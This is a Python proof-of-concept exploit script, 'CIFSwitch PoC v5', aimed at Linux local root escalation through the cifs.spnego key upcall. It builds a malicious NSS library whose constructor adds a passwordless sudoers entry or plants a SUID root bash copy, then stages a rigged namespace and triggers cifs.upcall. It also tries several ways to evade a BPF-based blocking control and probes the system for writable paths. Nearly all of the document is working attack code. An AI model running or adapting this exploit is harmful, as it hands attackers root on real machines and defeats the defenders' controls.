#!/usr/bin/env python3
"""
CIFSwitch PoC v5 — two-process CS bypass

Key insight: CS BPF may only block request_key("cifs.spnego") from
user namespaces. All previous tests ran inside unshare -Ur -m.

This version separates the exploit into two processes:
  Process A (ns_holder): runs inside unshare, sets up malicious namespace, sleeps
  Process B (trigger):   runs in INIT namespace, calls request_key with A's PID

If CS checks the caller's user namespace and only blocks non-init-ns callers,
the trigger from init namespace will succeed. cifs.upcall (invoked by kernel
as root) reads pid=A from key description, does setns to A's mount namespace,
loads our malicious NSS module → root shell.
"""

import json
import os
import pwd
import shlex
import shutil
import signal
import subprocess
import sys
import textwrap
import time
from pathlib import Path


RUN_TOKEN = "%s_%s" % (os.getuid(), os.getpid())
WORKDIR = Path("/tmp") / ("ses-%s" % RUN_TOKEN)
FAKELIB_DIR = WORKDIR / "fakelib"
FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
FAKE_HOSTS = WORKDIR / "hosts"
EVIDENCE_LOG = Path("/tmp/ev_%s.txt" % RUN_TOKEN)
ROOT_SHELL = Path("/var/tmp/rsh_%s" % RUN_TOKEN)
UNSHARE_COMMAND = ["unshare", "-Ur", "-m"]


LIBNSS_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define EVIDENCE_PATH @@EVIDENCE_PATH@@
#define SUDOERS_PATH @@SUDOERS_PATH@@
#define SUDOERS_USER @@SUDOERS_USER@@
#define ROOT_SHELL_PATH @@ROOT_SHELL_PATH@@

static void write_all(int fd, const char *buf, size_t len)
{
        while (len) {
                ssize_t ret = write(fd, buf, len);
                if (ret <= 0) return;
                buf += ret; len -= (size_t)ret;
        }
}

__attribute__((constructor))
static void pwn_constructor(void)
{
        int logfd = open(EVIDENCE_PATH, O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0644);
        if (logfd >= 0) {
                dprintf(logfd, "NSS loaded uid=%d euid=%d pid=%d ppid=%d\n",
                        getuid(), geteuid(), getpid(), getppid());
                char exe[256]; ssize_t l = readlink("/proc/self/exe", exe, sizeof(exe)-1);
                if (l > 0) { exe[l] = 0; dprintf(logfd, "exe=%s\n", exe); }
        }
        /* Try sudoers first */
        mkdir("/etc/sudoers.d", 0755);
        int sfd = open(SUDOERS_PATH, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0440);
        if (sfd >= 0) {
                dprintf(sfd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", SUDOERS_USER);
                fchmod(sfd, 0440); fsync(sfd); close(sfd);
                if (logfd >= 0) dprintf(logfd, "wrote sudoers: %s\n", SUDOERS_PATH);
        } else {
                /* Fallback: SUID root shell */
                int in_fd = open("/bin/bash", O_RDONLY|O_CLOEXEC);
                if (in_fd >= 0) {
                        int out_fd = open(ROOT_SHELL_PATH, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 04755);
                        if (out_fd >= 0) {
                                char buf[8192]; ssize_t n;
                                while ((n = read(in_fd, buf, sizeof(buf))) > 0)
                                        write_all(out_fd, buf, (size_t)n);
                                fchown(out_fd, 0, 0); fchmod(out_fd, 04755);
                                fsync(out_fd); close(out_fd);
                                if (logfd >= 0) dprintf(logfd, "fallback shell: %s\n", ROOT_SHELL_PATH);
                        }
                        close(in_fd);
                }
        }
        if (logfd >= 0) close(logfd);
}

enum nss_status _nss_pwn_getpwuid_r(uid_t uid, struct passwd *pwd,
                                    char *buffer, size_t buflen, int *errnop)
{
        const char *name="root", *dir="/root", *shell="/bin/bash";
        size_t need = strlen(name)*2 + strlen(dir) + strlen(shell) + 4;
        if (buflen < need) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }
        char *p = buffer;
        strcpy(p, name); pwd->pw_name = p; p += strlen(p)+1;
        strcpy(p, name); pwd->pw_gecos = p; p += strlen(p)+1;
        strcpy(p, dir);  pwd->pw_dir = p;   p += strlen(p)+1;
        strcpy(p, shell); pwd->pw_shell = p;
        pwd->pw_passwd = (char*)"x"; pwd->pw_uid = uid; pwd->pw_gid = 0;
        *errnop = 0; return NSS_STATUS_SUCCESS;
}
'''


# ns_holder: runs inside unshare, sets up namespace, prints PID, sleeps
NS_HOLDER_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>

#ifndef MS_REC
#define MS_REC 16384
#endif
#ifndef MS_PRIVATE
#define MS_PRIVATE (1<<18)
#endif
#ifndef MS_BIND
#define MS_BIND 4096
#endif

#define KEYCTL_JOIN_SESSION_KEYRING 1

static void die(const char *what) { perror(what); exit(1); }

static void mask_dir_if_present(const char *path)
{
        struct stat st;
        if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode)) return;
        mount("tmpfs", path, "tmpfs", 0, "mode=755");
}

static int do_overlay(const char *fakelib, const char *libdir,
                      const char *wkdir, int idx)
{
        char opts[4096], upper[512], work[512];
        snprintf(upper, sizeof(upper), "%s/ou%d", wkdir, idx);
        snprintf(work, sizeof(work), "%s/ow%d", wkdir, idx);
        mkdir(upper, 0755); mkdir(work, 0755);
        snprintf(opts, sizeof(opts), "lowerdir=%s:%s,upperdir=%s,workdir=%s",
                 fakelib, libdir, upper, work);
        if (mount("overlay", libdir, "overlay", 0, opts) == 0) return 0;
        if (mount(fakelib, libdir, NULL, MS_BIND | MS_REC, NULL) == 0) return 0;
        return -1;
}

static volatile int keep_running = 1;
static void sigterm_handler(int sig) { (void)sig; keep_running = 0; }

int main(int argc, char **argv)
{
        /* argv: fakelib nsswitch hosts workdir libdir... */
        if (argc < 6) {
                fprintf(stderr, "ns_holder: need fakelib nsswitch hosts workdir libdir...\n");
                return 2;
        }

        signal(SIGTERM, sigterm_handler);
        signal(SIGINT, sigterm_handler);

        syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "cifs-poc", 0, 0, 0);

        if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
                die("make mounts private");
        mask_dir_if_present("/run/nscd");
        mask_dir_if_present("/var/run/nscd");

        /* Bind nsswitch.conf */
        const char *nss_targets[] = {"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf", NULL};
        int nss_ok = 0;
        for (int i = 0; nss_targets[i]; i++) {
                struct stat st;
                if (stat(nss_targets[i], &st) != 0) continue;
                if (mount(argv[2], nss_targets[i], NULL, MS_BIND, NULL) == 0) { nss_ok = 1; break; }
        }
        if (!nss_ok) die("bind nsswitch.conf");

        /* Bind /etc/hosts */
        { struct stat st; if (stat("/etc/hosts", &st) == 0)
                mount(argv[3], "/etc/hosts", NULL, MS_BIND, NULL); }

        /* Overlay NSS lib dirs */
        for (int i = 5; i < argc; i++)
                if (do_overlay(argv[1], argv[i], argv[4], i - 5) != 0)
                        die("mount nss libdir");

        /* Signal parent: namespace is ready. Print our PID. */
        fprintf(stdout, "READY %d\n", getpid());
        fflush(stdout);

        /* Hold the namespace alive until killed */
        while (keep_running)
                sleep(1);

        return 0;
}
'''


# trigger: runs in init namespace OR inside unshare, calls request_key/add_key
TRIGGER_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define NR_add_key     __NR_add_key
#define NR_request_key __NR_request_key
#define NR_keyctl      __NR_keyctl

#define KEY_SPEC_SESSION_KEYRING (-3)
#define KEYCTL_JOIN_SESSION_KEYRING 1

int main(int argc, char **argv)
{
        if (argc < 3) {
                fprintf(stderr, "usage: trigger <mode> <target_pid>\n");
                fprintf(stderr, "  mode: rk = request_key, ak = add_key, both = try both\n");
                return 2;
        }

        const char *mode = argv[1];
        int target_pid = atoi(argv[2]);

        char desc[768];
        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 target_pid);

        syscall(NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "cifs-trigger", 0, 0, 0);

        fprintf(stderr, "[trigger] pid=%d uid=%d mode=%s target_pid=%d\n",
                getpid(), getuid(), mode, target_pid);
        fprintf(stderr, "[trigger] desc: %s\n", desc);

        long rc;

        if (strcmp(mode, "rk") == 0 || strcmp(mode, "both") == 0) {
                /* request_key from current namespace context */
                errno = 0;
                rc = syscall(NR_request_key, "cifs.spnego", desc, "",
                             KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "[trigger] request_key(cifs.spnego): rc=%ld errno=%d (%s)\n",
                        rc, errno, strerror(errno));
                if (rc >= 0) {
                        fprintf(stderr, "[trigger] SUCCESS! key=%ld\n", rc);
                        sleep(3); /* let cifs.upcall finish */
                        return 0;
                }
        }

        if (strcmp(mode, "ak") == 0 || strcmp(mode, "both") == 0) {
                /* add_key — different code path, might bypass CS */
                char payload[] = "dummy-spnego-token";
                errno = 0;
                rc = syscall(NR_add_key, "cifs.spnego", desc, payload,
                             (unsigned long)strlen(payload),
                             KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "[trigger] add_key(cifs.spnego): rc=%ld errno=%d (%s)\n",
                        rc, errno, strerror(errno));
                if (rc >= 0) {
                        fprintf(stderr, "[trigger] add_key SUCCESS! key=%ld\n", rc);
                        /* Key exists but cifs.upcall won't auto-run.
                           Try to exec it manually with correct args. */
                        char ks[32]; snprintf(ks, sizeof(ks), "%ld", rc);
                        fprintf(stderr, "[trigger] exec cifs.upcall with key %s\n", ks);
                        /* Note: runs as uid=2029, not root. Diagnostic only. */
                        execl("/usr/sbin/cifs.upcall", "cifs.upcall", "-t", "-v",
                              ks, (char*)NULL);
                        fprintf(stderr, "[trigger] exec failed: %s\n", strerror(errno));
                }
        }

        /* Also try request_key for cifs.idmap with spnego-style desc */
        errno = 0;
        rc = syscall(NR_request_key, "cifs.idmap", desc, "",
                     KEY_SPEC_SESSION_KEYRING);
        fprintf(stderr, "[trigger] request_key(cifs.idmap): rc=%ld errno=%d (%s)\n",
                rc, errno, strerror(errno));

        fprintf(stderr, "[trigger] no bypass found\n");
        return 1;
}
'''


def shell_join(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)

def step(msg):
    print("\n***%s***" % msg, flush=True)

def run(cmd, check=True, cwd=None):
    print("$ " + shell_join(cmd), flush=True)
    c = subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    if c.stdout: print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        raise SystemExit("command failed: %s" % shell_join(cmd))
    return c

def run_quiet(cmd, cwd=None):
    return subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                          universal_newlines=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, check=False)

def write_text(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")

def c_str(value):
    return json.dumps(str(value))


def main():
    if os.getuid() == 0:
        raise SystemExit("run as unprivileged user")
    username = pwd.getpwuid(os.getuid()).pw_name
    sudoers_path = Path("/etc/sudoers.d/cifs-poc-%s" % RUN_TOKEN)

    step("PREFLIGHT")
    print("uid=%d user=%s" % (os.getuid(), username), flush=True)
    c = run_quiet(UNSHARE_COMMAND + ["true"])
    if c.returncode != 0:
        raise SystemExit("unshare -Ur -m not available")

    # Detect NSS lib dirs
    nss_lib_dirs = []
    for d in [Path("/usr/lib64"), Path("/lib64"), Path("/lib/x86_64-linux-gnu")]:
        if (d / "libnss_files.so.2").exists():
            nss_lib_dirs.append(d.resolve())
    if not nss_lib_dirs:
        raise SystemExit("no NSS lib dir found")

    step("BUILDING")
    shutil.rmtree(str(WORKDIR), ignore_errors=True)
    FAKELIB_DIR.mkdir(parents=True)

    nss_src = (LIBNSS_SOURCE
               .replace("@@EVIDENCE_PATH@@", c_str(EVIDENCE_LOG))
               .replace("@@SUDOERS_PATH@@", c_str(sudoers_path))
               .replace("@@SUDOERS_USER@@", c_str(username))
               .replace("@@ROOT_SHELL_PATH@@", c_str(ROOT_SHELL)))
    write_text(WORKDIR / "libnss_pwn.c", nss_src)
    write_text(WORKDIR / "ns_holder.c", NS_HOLDER_SOURCE)
    write_text(WORKDIR / "trigger.c", TRIGGER_SOURCE)

    write_text(FAKE_NSSWITCH,
               "passwd: pwn files\ngroup: pwn files\nshadow: pwn files\n"
               "hosts: pwn files dns\nservices: pwn files\n")
    write_text(FAKE_HOSTS, "127.0.0.1 localhost\n")

    run(["gcc", "-Wall", "-Wextra", "-shared", "-fPIC", "-o",
         "fakelib/libnss_pwn.so.2", "libnss_pwn.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-o", "ns_holder", "ns_holder.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-o", "trigger", "trigger.c"], cwd=WORKDIR)

    # ── Start namespace holder ──────────────────────────────────────────
    step("STARTING NAMESPACE HOLDER")
    holder_cmd = UNSHARE_COMMAND + [
        str(WORKDIR / "ns_holder"),
        str(FAKELIB_DIR),
        str(FAKE_NSSWITCH),
        str(FAKE_HOSTS),
        str(WORKDIR),
    ] + [str(p) for p in nss_lib_dirs]
    print("$ " + shell_join(holder_cmd), flush=True)
    holder_proc = subprocess.Popen(
        [str(a) for a in holder_cmd],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
    )

    # Read PID from holder
    target_pid = None
    try:
        line = holder_proc.stdout.readline()
        if line.startswith("READY "):
            target_pid = int(line.split()[1])
            print("namespace holder ready, pid=%d" % target_pid, flush=True)
    except Exception as e:
        print("failed to read holder PID: %s" % e, flush=True)

    if target_pid is None:
        # Read stderr for error
        holder_proc.wait(timeout=5)
        err = holder_proc.stderr.read()
        if err:
            print("holder stderr: %s" % err, flush=True)
        raise SystemExit("namespace holder failed to start")

    try:
        # ── ATTEMPT 1: request_key from INIT namespace ─────────────────
        step("ATTEMPT 1: request_key from INIT namespace (NO unshare)")
        print("target pid=%d (in malicious namespace)" % target_pid, flush=True)
        c = run([str(WORKDIR / "trigger"), "rk", str(target_pid)],
                cwd=WORKDIR, check=False)
        time.sleep(2)

        if EVIDENCE_LOG.exists():
            ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
            print("\n=== EVIDENCE ===\n%s" % ev, flush=True)
            return

        # ── ATTEMPT 2: add_key from INIT namespace ─────────────────────
        step("ATTEMPT 2: add_key from INIT namespace")
        c = run([str(WORKDIR / "trigger"), "ak", str(target_pid)],
                cwd=WORKDIR, check=False)
        time.sleep(2)

        if EVIDENCE_LOG.exists():
            ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
            print("\n=== EVIDENCE ===\n%s" % ev, flush=True)
            return

        # ── ATTEMPT 3: request_key from INSIDE a different user ns ─────
        step("ATTEMPT 3: request_key from SEPARATE user namespace")
        c = run(["unshare", "-Ur",
                 str(WORKDIR / "trigger"), "both", str(target_pid)],
                cwd=WORKDIR, check=False)
        time.sleep(2)

        if EVIDENCE_LOG.exists():
            ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
            print("\n=== EVIDENCE ===\n%s" % ev, flush=True)
            return

        # ── ATTEMPT 4: request_key from INSIDE holder's namespace ──────
        # (standard CIFSwitch — known to fail, but test for comparison)
        step("ATTEMPT 4: request_key from INSIDE holder namespace (standard)")
        # We need a new trigger that runs inside the SAME namespace as holder.
        # Use nsenter to enter holder's namespaces, then call request_key.
        # nsenter needs CAP_SYS_ADMIN which we don't have from init ns.
        # Instead, we have the holder exec the trigger itself.
        # Actually, the simplest: run trigger inside the SAME unshare.
        # But holder is already running. So just run a new unshare instance
        # with its own namespace and trigger inside it.
        inner_trigger_src = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#ifndef MS_REC
#define MS_REC 16384
#endif
#ifndef MS_PRIVATE
#define MS_PRIVATE (1<<18)
#endif
#ifndef MS_BIND
#define MS_BIND 4096
#endif

#define KEYCTL_JOIN_SESSION_KEYRING 1
#define KEY_SPEC_SESSION_KEYRING (-3)

int main(int argc, char **argv)
{
        if (argc < 6) return 2;
        /* argv: fakelib nsswitch hosts workdir libdir... */

        syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "cifs-inner", 0, 0, 0);
        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);

        /* Mask nscd */
        struct stat st;
        if (stat("/run/nscd", &st) == 0 && S_ISDIR(st.st_mode))
                mount("tmpfs", "/run/nscd", "tmpfs", 0, "mode=755");
        if (stat("/var/run/nscd", &st) == 0 && S_ISDIR(st.st_mode))
                mount("tmpfs", "/var/run/nscd", "tmpfs", 0, "mode=755");

        /* Bind nsswitch */
        if (stat("/etc/nsswitch.conf", &st) == 0)
                mount(argv[2], "/etc/nsswitch.conf", NULL, MS_BIND, NULL);
        if (stat("/etc/hosts", &st) == 0)
                mount(argv[3], "/etc/hosts", NULL, MS_BIND, NULL);

        /* Overlay lib dirs */
        for (int i = 5; i < argc; i++) {
                char opts[4096], upper[512], work[512];
                snprintf(upper, sizeof(upper), "%s/ou%d", argv[4], 10+i);
                snprintf(work, sizeof(work), "%s/ow%d", argv[4], 10+i);
                mkdir(upper, 0755); mkdir(work, 0755);
                snprintf(opts, sizeof(opts), "lowerdir=%s:%s,upperdir=%s,workdir=%s",
                         argv[1], argv[i], upper, work);
                if (mount("overlay", argv[i], "overlay", 0, opts) != 0)
                        mount(argv[1], argv[i], NULL, MS_BIND | MS_REC, NULL);
        }

        char desc[768];
        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 getpid());

        fprintf(stderr, "[inner] pid=%d calling request_key(cifs.spnego)\n", getpid());
        errno = 0;
        long rc = syscall(__NR_request_key, "cifs.spnego", desc, "",
                          KEY_SPEC_SESSION_KEYRING);
        fprintf(stderr, "[inner] rc=%ld errno=%d (%s)\n", rc, errno, strerror(errno));
        if (rc >= 0) { sleep(3); return 0; }
        return 1;
}
'''
        write_text(WORKDIR / "inner_trigger.c", inner_trigger_src)
        run(["gcc", "-Wall", "-Wextra", "-o", "inner_trigger", "inner_trigger.c"],
            cwd=WORKDIR)
        run(UNSHARE_COMMAND + [
            str(WORKDIR / "inner_trigger"),
            str(FAKELIB_DIR), str(FAKE_NSSWITCH), str(FAKE_HOSTS), str(WORKDIR),
        ] + [str(p) for p in nss_lib_dirs],
            cwd=WORKDIR, check=False)
        time.sleep(2)

        if EVIDENCE_LOG.exists():
            ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
            print("\n=== EVIDENCE ===\n%s" % ev, flush=True)
            return

        # ── Quick recon on what blocks us ──────────────────────────────
        step("DIAGNOSTICS")
        for label, cmd in [
            ("writable dirs", "for d in /etc/request-key.d /usr/share/keyutils "
             "/etc/cifs-utils /etc/gss/mech.d /etc/krb5.conf.d; do "
             "test -w \"$d\" 2>/dev/null && echo \"WRITABLE: $d\"; done; echo done"),
            ("handler perms", "ls -la /usr/sbin/cifs.upcall /usr/sbin/cifs.idmap "
             "/usr/share/keyutils/request-key-debug.sh 2>/dev/null"),
            ("cifs.upcall caps", "getcap /usr/sbin/cifs.upcall 2>/dev/null"),
            ("writable libs", "ldd /usr/sbin/cifs.upcall 2>/dev/null | awk '{print $3}' | "
             "while read f; do [ -n \"$f\" ] && [ -w \"$(dirname \"$f\")\" ] && "
             "echo \"WRITABLE DIR: $(dirname \"$f\")\"; done; echo done"),
            ("request-key.conf", "cat /etc/request-key.conf 2>/dev/null"),
            ("bpf progs", "bpftool prog list 2>/dev/null | head -30 || echo 'bpftool unavailable'"),
        ]:
            out = subprocess.run(cmd, shell=True, universal_newlines=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 check=False).stdout.strip()
            print("--- %s ---\n%s\n" % (label, out), flush=True)

        print("\nNo bypass found. Review diagnostics above.", flush=True)

    finally:
        # Kill holder
        try:
            holder_proc.send_signal(signal.SIGTERM)
            holder_proc.wait(timeout=5)
        except Exception:
            try:
                holder_proc.kill()
            except Exception:
                pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
